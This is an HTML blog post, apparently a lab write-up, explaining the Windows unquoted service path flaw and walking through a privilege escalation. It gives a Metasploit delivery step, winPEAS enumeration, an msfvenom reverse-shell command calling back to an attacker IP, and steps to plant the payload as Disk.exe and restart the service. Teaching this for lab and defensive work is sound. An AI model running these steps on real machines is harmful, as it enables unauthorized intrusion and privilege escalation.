@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Unquoted Service Path - Windows Escalation - </title><meta name="Description" content="Let&#39;s learn how Unquoted Service Paths can lead to a Windows Escalation"><meta property="og:title" content="Unquoted Service Path - Windows Escalation" />
+<meta property="og:description" content="Let&#39;s learn how Unquoted Service Paths can lead to a Windows Escalation" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/unquoted-service-path-windows-escalation/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-07-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-07-04T00:00:00+00:00" /><meta property="og:site_name" content="SecurityNguyen Site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Unquoted Service Path - Windows Escalation"/>
+<meta name="twitter:description" content="Let&#39;s learn how Unquoted Service Paths can lead to a Windows Escalation"/>
+<meta name="application-name" content="SecurityNguyen">
+<meta name="apple-mobile-web-app-title" content="SecurityNguyen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/posts/unquoted-service-path-windows-escalation/" /><link rel="prev" href="/posts/linux-privilege-escalation/capstone-challenge-linux-escalation-privilege/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Unquoted Service Path - Windows Escalation",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/unquoted-service-path-windows-escalation\/"
+        },"genre": "posts","keywords": "Red Team, Windows","wordcount":  732 ,
+        "url": "\/posts\/unquoted-service-path-windows-escalation\/","datePublished": "2023-07-04T00:00:00+00:00","dateModified": "2023-07-04T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nguyen Nguyen"
+            },"description": "Let's learn how Unquoted Service Paths can lead to a Windows Escalation"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">SecurityNguyen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">SecurityNguyen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Unquoted Service Path - Windows Escalation</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetration-testing/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Penetration Testing</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-04">2023-07-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;732 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#background-information">Background Information:</a></li>
+    <li><a href="#demonstration">Demonstration</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Note: If you need to zoom in, you can click on the image.</p>
+<style>
+	.zoom {
+	            transition: transform 0.3s;
+	            cursor: pointer;
+	        }
+	        
+	        .overlay {
+	            position: fixed;
+	            top: 0;
+	            left: 0;
+	            width: 100%;
+	            height: 100%;
+	            background-color: rgba(0, 0, 0, 0.5);
+	            display: none;
+	            justify-content: center;
+	            align-items: center;
+	            z-index: 999;
+	            pointer-events: none;
+	        }
+	        
+	        .zoomed-image {
+	            max-width: 80%;
+	            max-height: 80%;
+	            transition: transform 0.3s;
+	        }
+	        
+	        .zoomed-image.zoomed {
+	            transform: scale(1.5);
+	        }
+</style>
+<h2 id="background-information">Background Information:</h2>
+<p>Unquoted Service Path occurs when the path to the executable (that the service used) is misinterpreted by Service Control Manager due to the spaces and lack of &quot;&quot; (quotation mark) surrounding the path.</p>
+<p>Here are some of the following examples:
+<br>
+Proper executable Path:
+<code>&quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot; -service</code></p>
+<p>Incorrect executable Path:
+<code>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</code>
+<br>
+<br>
+Why are spaces and quotation mark a big deal?
+<br>
+When you send a command, spaces are used as argument separators unless they are part of a quoted string.</p>
+<p>Here is how a service control manager would evaluate a binary path:
+<br>
+We will use this as our example: <code>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</code></p>
+<ol>
+	<li>First, SCM will look for: C:\MyPrograms\Disk.exe with argument of Sorter and Enterprise\bin\disksrs.exe. If it can't find Disk.exe, then it moves on to step two.
+	<br>
+	<br>
+	<li> SCM will look for: C:\MyPrograms\Disk Sorter.exe with argument of Enterprise\bin\disksrs.exe. If SCM can't find C:\MyPrograms\Disk Sorter.exe then it moves to step 3.
+	<br>
+	<br>
+	<li> SCM will look for: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe. Usually that the end of the search.
+</ol>
+Thus, can you see how long we had to wait before SCM found the application? The attacker can abuse this by creating a malicious file and rename it to Disk.exe and put it in the same location. Allowing the malicious program to be running first then the legit program. Let's see it in action shall we?
+<h2 id="demonstration">Demonstration</h2>
+<p>First, I will install this Windows Enumeration Script (winPEAS) that finds potential escalation privilege. This is the script: <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener noreffer ">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>.
+<br>
+To deliver this script to the target windows. I will use the Web Delivery Module in Metasploit.
+<br>
+<img class="zoom" src="/images/linux_priv_53.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_53.png">
+</div>
+<p>After running, Metasploit should generate a shellcode. Paste that shellcode in the Windows command line and Metasploit should be establishing a connection to the windows. Once Metasploit has establish connection with the Command Shell. We can upgrade the shell to a meterpreter using the command:
+<code>sessions -u 1</code>
+<br>
+<img class="zoom" src="/images/linux_priv_54.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_54.png">
+</div>
+<p>Now, we will go inside sessions 2 using: <code>sessions -i 2</code>. Then begin our process of transferring the script to the target machine. The command we are going to use: <code>upload binary_path</code>.
+<br>
+<br>
+My winPEASx64 binary is in /home/kali/Downloads. I will use this command: <code>upload /home/kali/Downloads/winPEASx64.exe</code>. Then I will spawn a shell and execute the enumeration script to see where I can perform Unquoted service path vulnerability.
+<br>
+<br>
+Some notes about winPEAS:
+<br>
+You can get the help (man) page using <code>.\winPEASx64.exe help</code>. This will allow you to specify the info you&rsquo;re looking for.
+<br>
+<br>
+Note: that if you don&rsquo;t specify what you&rsquo;re looking for and plain out run it, It will look for all the information listed above. Since we are going work with services, I&rsquo;m interested in servicesinfo. Let run it using <code>.\winPEASx64 servicesinfo</code> and to get it to save the output to a file so we can look at it later, at the end of the command we can do: <code>&gt; service_info.txt</code>.
+<br>
+<br>
+Terminal version:
+<br>
+<img class="zoom" src="/images/linux_priv_56.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_56.png">
+</div>
+<p>Notepad version:
+<br>
+<img class="zoom" src="/images/linux_priv_55.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_55.png">
+</div>
+<p>From the terminal picture above, It say Disk Sorter Enterprise - No Quotes and Space Detected. This mean we can carry out Unquoted Service Path attack on this service. To get more further detail on a service we can run: <code>sc qc &quot;Disk Sorter Enterprise&quot;</code>
+<br>
+<img class="zoom" src="/images/linux_priv_57.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_57.png">
+</div>
+BINARY_PATH_NAME point to the executable that the service is running and SERVICE_START_NAME point to the users. 
+<br>
+<br>
+The plan is replace the binary with our malicious executable.
+<br>
+<br>
+The next step is to create a listener in our Metasploit. We can do this by the multi/handler option. I'm not going go over the steps to do that.
+<br>
+<img class="zoom" src="/images/linux_priv_57.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_57.png">
+</div>
+<p>Then we are going to create our malicious program which connect to our listener. For this, I am going to use MSFvenom. MSF venom is included in Kali Linux.
+<br>
+Command: <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.29.190 LPORT=6777 -f exe-service -o poison_ivy.exe</code>
+<br>
+<img class="zoom" src="/images/linux_priv_58.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_58.png">
+</div>
+<p>Now, it time to transfer the poison_ivy.exe to the target machine using: <code>upload /home/kali/Downloads/poison_ivy.exe</code>. Once we transfer poison_ivy.exe to the machine.  We have to move to <code>C:\MyPrograms\</code>  directory and move poison_ivy.exe to here and rename the file to Disk.exe.
+<br>
+<br>
+This is the command we will run: <code>move C:\Users\thm-unpriv\poison_ivy.exe Disk.exe</code> and then grant it Everyone:F - So it can be run by anyone. Using this command: <code>icalcs C:\MyPrograms\Disk.exe /grant Everyone:F</code></p>
+<p>Now, it time to restart the service by turning it off and on.
+<br>
+<code>sc stop &quot;disk sorter enterprise&quot;</code>
+<br>
+<code>sc start &quot;disk sorter enterprise&quot;</code>
+Then you should got a shell. Congratulations we just escalated our privilege.</p>
+<p>That&rsquo;s all. Thanks for reading.</p>
+<!-- Zoom Animation Feature -->
+<script>
+	const zooms = document.querySelectorAll('.zoom');
+	const overlay = document.querySelector('.overlay');
+	const zoomedImage = document.querySelector('.zoomed-image');
+	
+	zooms.forEach(function(zoom) {
+		zoom.addEventListener('click', function() {
+			overlay.style.display = 'flex';
+			overlay.style.pointerEvents = 'auto';
+			zoomedImage.src = zoom.src;
+			zoomedImage.classList.add('zoomed');
+		});
+	});
+	
+	overlay.addEventListener('click', function() {
+		overlay.style.display = 'none';
+		overlay.style.pointerEvents = 'none';
+		zoomedImage.classList.remove('zoomed');
+	});
+</script></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-07-04</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/unquoted-service-path-windows-escalation/" data-title="Unquoted Service Path - Windows Escalation" data-hashtags="Red Team,Windows"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/posts/unquoted-service-path-windows-escalation/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/red-team/">Red Team</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-privilege-escalation/capstone-challenge-linux-escalation-privilege/" class="prev" rel="prev" title="Capstone Challenge"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Capstone Challenge</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/tryhardnguyen" target="_blank">Nguyen Nguyen</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
